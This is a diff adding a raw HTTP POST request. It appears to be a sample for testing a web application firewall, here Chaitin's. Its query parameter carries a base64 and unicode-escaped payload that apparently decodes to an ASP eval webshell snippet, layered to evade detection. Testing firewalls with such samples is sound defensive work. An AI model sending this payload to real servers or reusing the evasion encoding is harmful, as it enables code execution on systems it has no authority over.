@@ -1,0 +1,13 @@
+POST /interaction/plus/confidentiality/render/cost-efficient?attach=false%20positive&handle=WwlmYWxzZQksZmFsc2UsZmFsc2UKLCJcdTAwMzNcdTAwNjNcdTAwMzJcdTAwMzVcdTAwMzZcdTAwMzVcdTAwMzdcdTAwMzZcdTAwMzZcdTAwMzFcdTAwMzZcdTAwNjNcdTAwMzJcdTAwMzBcdTAwMzdcdTAwMzJcdTAwMzZcdTAwMzVcdTAwMzdcdTAwMzFcdTAwMzdcdTAwMzVcdTAwMzZcdTAwMzVcdTAwMzdcdTAwMzNcdTAwMzdcdTAwMzRcdTAwMzJcdTAwMzhcdTAwMzJcdTAwMzJcdTAwMzdcdTAwMzNcdTAwMzZcdTAwMzJcdTAwMzJcdTAwMzJcdTAwMzJcdTAwMzlcdTAwMzJcdTAwMzVcdTAwMzNcdTAwNjUiCV0g HTTP/1.1
+Host: waf-ce.chaitin.cn
+Cache-Control: no-cache
+Pragma: no-cache
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: keep-alive
+Content-Length: 0
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:41.0) Gecko/20100101 Firefox/41.0
+Cookie: percent=bogus; SESSIONID=1cf3f3334a6f80514f1f5ab5d923ebf7180006504c81527b79a962431d44dfb7982b2972b9554fc7eaaf6079b8785827
+
